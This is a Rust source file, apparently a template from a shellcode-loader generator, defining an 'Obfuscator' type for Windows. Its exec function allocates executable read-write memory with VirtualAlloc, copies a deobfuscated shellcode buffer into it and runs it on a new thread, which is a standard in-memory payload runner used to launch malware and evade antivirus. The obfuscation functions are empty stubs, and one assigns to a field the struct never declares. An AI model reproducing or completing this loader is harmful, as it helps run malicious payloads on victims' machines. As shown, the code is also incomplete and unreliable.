use super::*;
#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct Obfuscator {}

impl Obfuscation for Obfuscator {
    fn new() -> Self {
        Obfuscator {}
    }

    fn obfuscate(&mut self, sc: &[u8]) {
        let mut enc_sc = Vec::new();

        self.esc = enc_sc;
    }

    fn deobfuscate(&self) -> Vec<u8> {
        let mut dec_esc = Vec::new();

        dec_esc
    }

    fn exec(&self) {
        let sc = self.deobfuscate();
        use std::mem::transmute;
        use winapi::um::errhandlingapi::GetLastError;
        use winapi::um::memoryapi::VirtualAlloc;
        use winapi::um::processthreadsapi::CreateThread;
        use winapi::um::synchapi::WaitForSingleObject;
        unsafe {
            let ptr = VirtualAlloc(std::ptr::null_mut(), sc.len(), 0x00001000, 0x40);

            if GetLastError() == 0 {
                std::ptr::copy(sc.as_ptr() as *const u8, ptr as *mut u8, sc.len());

                let mut threadid = 0;
                let threadhandle = CreateThread(
                    std::ptr::null_mut(),
                    0,
                    Some(transmute(ptr)),
                    std::ptr::null_mut(),
                    0,
                    &mut threadid,
                );

                WaitForSingleObject(threadhandle, 0xFFFFFFFF);
            } else {
                println!("执行失败：{}", GetLastError());
            }
        }
    }
}
